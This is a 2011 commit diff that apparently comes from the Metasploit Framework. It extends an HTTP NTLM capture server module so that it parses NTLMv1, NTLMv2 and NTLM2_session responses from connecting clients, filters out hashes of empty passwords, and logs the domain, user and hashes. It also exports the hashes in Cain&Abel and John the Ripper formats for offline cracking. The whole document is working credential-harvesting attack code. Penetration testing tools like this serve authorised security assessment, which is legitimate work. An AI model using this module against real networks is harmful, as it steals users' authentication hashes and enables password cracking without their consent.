fd661770edfe1a4c838c6182b0d7a7e6fcb63ed8
amaloteaux <>
2011-05-07 18:52:17 +0000

    Fix #4362, thanks to Zack Fasel for report and initial patch
    git-svn-id: file:///home/svn/framework3/trunk@12560 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/auxiliary/server/capture/http_ntlm.rb
+++ modules/auxiliary/server/capture/http_ntlm.rb
@@ -12,10 +12,11 @@
 require 'msf/core'
 
 require 'rex/proto/ntlm/constants'
+require 'rex/proto/ntlm/message'
+require 'rex/proto/ntlm/crypt'
 
 NTLM_CONST = Rex::Proto::NTLM::Constants
-
-require 'rex/proto/ntlm/message'
+NTLM_CRYPT = Rex::Proto::NTLM::Crypt
 MESSAGE = Rex::Proto::NTLM::Message
 
 class Metasploit3 < Msf::Auxiliary
@@ -47,8 +48,9 @@ class Metasploit3 < Msf::Auxiliary
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptString.new('LOGFILE', [ false, "The local filename to store the captured hashes", nil ]),
-			OptString.new('PWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+			OptString.new('LOGFILE',     [ false, "The local filename to store the captured hashes", nil ]),
+			OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+			OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
 			OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
 
 		], self.class)
@@ -123,42 +125,44 @@ class Metasploit3 < Msf::Auxiliary
 		#if the message is a type 3 message, then we have our creds
 		elsif(message[8,1] == "\x03")
 			domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
-			print_status("#{cli.peerhost}: #{domain}\\#{user} #{lm_hash}:#{ntlm_hash} on #{host}")
+			nt_len = ntlm_hash.length
 
-			if(datastore['LOGFILE'])
-				fd = File.open(datastore['LOGFILE'], "ab")
-				fd.puts(
-					[
-						Time.now.to_s,
-						cli.peerhost,
-						host,
-						domain ? domain : "<NULL>",
-						user ? user : "<NULL>",
-						lm_hash ? lm_hash : "<NULL>",
-						ntlm_hash ? ntlm_hash : "<NULL>"
-					].join(":").gsub(/\n/, "\\n")
-				)
-				fd.close
+			if nt_len == 48 #lmv1/ntlmv1 or ntlm2_session
+				arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+					:lm_hash => lm_hash,
+					:nt_hash => ntlm_hash
+				}
+
+				if arg[:lm_hash][16,32] == '0' * 32
+					arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				end
+			#if the length of the ntlm response is not 24 then it will be bigger and represent
+			# a ntlmv2 response
+			elsif nt_len > 48 #lmv2/ntlmv2
+				arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
+					:lm_hash 		=> lm_hash[0, 32],
+					:lm_cli_challenge 	=> lm_hash[32, 16],
+					:nt_hash 		=> ntlm_hash[0, 32],
+					:nt_cli_challenge 	=> ntlm_hash[32, nt_len  - 32]
+				}
+			elsif nt_len == 0
+				print_status("Empty hash from #{host} captured, ignoring ... ")
+			else
+				print_status("Unknow hash type from #{host}, ignoring ...")
 			end
 
-			if(datastore['PWFILE'] and user and lm_hash)
-				fd = File.open(datastore['PWFILE'], "ab+")
-				fd.puts(
-					[
-						user,
-						domain ? domain : "NULL",
-						@challenge.unpack("H*")[0],
-						lm_hash ? lm_hash : "0" * 32,
-						ntlm_hash ? ntlm_hash : "0" * 32
-					].join(":").gsub(/\n/, "\\n")
-				)
-				fd.close
+			arg[:host] = host
+			arg[:user] = user
+			arg[:domain] = domain
 
-			end
+			html_get_hash(arg)
+
 			response = create_response(200)
+			response.headers['Cache-Control'] = "no-cache"
 			return response
 		else
 			response = create_response(200)
+			response.headers['Cache-Control'] = "no-cache"
 			return response
 		end
 
@@ -183,6 +187,173 @@ class Metasploit3 < Msf::Auxiliary
 		end
 		return domain,workstation
 
+	end
+
+	def html_get_hash(arg = {})
+		ntlm_ver = arg[:ntlm_ver]
+		if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
+			lm_hash = arg[:lm_hash]
+			nt_hash = arg[:nt_hash]
+		else
+			lm_hash = arg[:lm_hash]
+			nt_hash = arg[:nt_hash]
+			lm_cli_challenge = arg[:lm_cli_challenge]
+			nt_cli_challenge = arg[:nt_cli_challenge]
+		end
+		domain = arg[:domain]
+		user = arg[:user]
+		host = arg[:host]
+		
+		unless @previous_lm_hash == lm_hash and @previous_ntlm_hash == nt_hash then
+
+			@previous_lm_hash = lm_hash
+			@previous_ntlm_hash = nt_hash
+
+			# Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
+			case ntlm_ver
+			when NTLM_CONST::NTLM_V1_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
+					print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
+					return
+				end
+				if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
+					lm_hash_message = "Disabled"
+				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
+								:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
+					lm_hash_message = "Disabled (from empty password)"
+				else
+					lm_hash_message = lm_hash
+					lm_chall_message = lm_cli_challenge
+				end
+			when NTLM_CONST::NTLM_V2_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [nt_cli_challenge].pack("H*"), 
+								:user => Rex::Text::to_ascii(user), 
+								:domain => Rex::Text::to_ascii(domain),
+								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
+					print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
+					return
+				end
+				if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
+					lm_hash_message = "Disabled"
+					lm_chall_message = 'Disabled'
+				elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [lm_cli_challenge].pack("H*"), 
+								:user => Rex::Text::to_ascii(user), 
+								:domain => Rex::Text::to_ascii(domain),
+								:ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
+					lm_hash_message = "Disabled (from empty password)"
+					lm_chall_message = 'Disabled'
+				else
+					lm_hash_message = lm_hash
+					lm_chall_message = lm_cli_challenge
+				end
+
+			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+								:cli_challenge => [lm_hash].pack("H*")[0,8],
+								:ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
+					print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
+					return
+				end
+				lm_hash_message = lm_hash
+				lm_chall_message = lm_cli_challenge
+			end
+
+			# Display messages
+			capturedtime = Time.now.to_s
+			case ntlm_ver
+			when NTLM_CONST::NTLM_V1_RESPONSE
+				capturelogmessage =
+					"#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
+					"DOMAIN: #{domain} USER: #{user} \n" +
+					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
+			when NTLM_CONST::NTLM_V2_RESPONSE
+				capturelogmessage =
+					"#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
+					"DOMAIN: #{domain} USER: #{user} \n" +
+					"LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
+					"LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
+					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
+					"NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
+			when NTLM_CONST::NTLM_2_SESSION_RESPONSE
+				capturelogmessage =
+					"#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
+					"DOMAIN: #{domain} USER: #{user} \n" +
+					"NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
+					"NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"
+
+			else # should not happen
+				return
+			end
+
+			print_status(capturelogmessage)
+
+			if(datastore['LOGFILE'])
+				File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
+			end
+
+			if(datastore['CAINPWFILE'] and user)
+				if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE then
+					fd = File.open(datastore['CAINPWFILE'], "ab")
+					fd.puts(
+						[
+							user,
+							domain ? domain : "NULL",
+							@challenge.unpack("H*")[0],
+							lm_hash ? lm_hash : "0" * 48,
+							nt_hash ? nt_hash : "0" * 48
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+				end
+			end
+
+			if(datastore['JOHNPWFILE'] and user)
+				case ntlm_ver
+				when NTLM_CONST::NTLM_V1_RESPONSE
+
+					fd = File.open(datastore['JOHNPWFILE'] + '_lmv1_ntlmv1', "ab")
+					fd.puts(
+						[
+							user,"",
+							domain ? domain : "NULL",
+							lm_hash ? lm_hash : "0" * 48,
+							nt_hash ? nt_hash : "0" * 48,
+							@challenge.unpack("H*")[0]
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+				when NTLM_CONST::NTLM_V2_RESPONSE
+					#lmv2
+					fd = File.open(datastore['JOHNPWFILE'] + '_lmv2', "ab")
+					fd.puts(
+						[
+							user,"",
+							domain ? domain : "NULL",
+							@challenge.unpack("H*")[0],
+							lm_hash ? lm_hash : "0" * 32,
+							lm_cli_challenge ? lm_cli_challenge : "0" * 16
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+					#ntlmv2
+					fd = File.open(datastore['JOHNPWFILE'] + '_ntlmv2' , "ab")
+					fd.puts(
+						[
+							user,"",
+							domain ? domain : "NULL",
+							@challenge.unpack("H*")[0],
+							nt_hash ? nt_hash : "0" * 32,
+							nt_cli_challenge ? nt_cli_challenge : "0" * 160
+						].join(":").gsub(/\n/, "\\n")
+					)
+					fd.close
+				end
+
+			end
+		end
 	end
 
 end
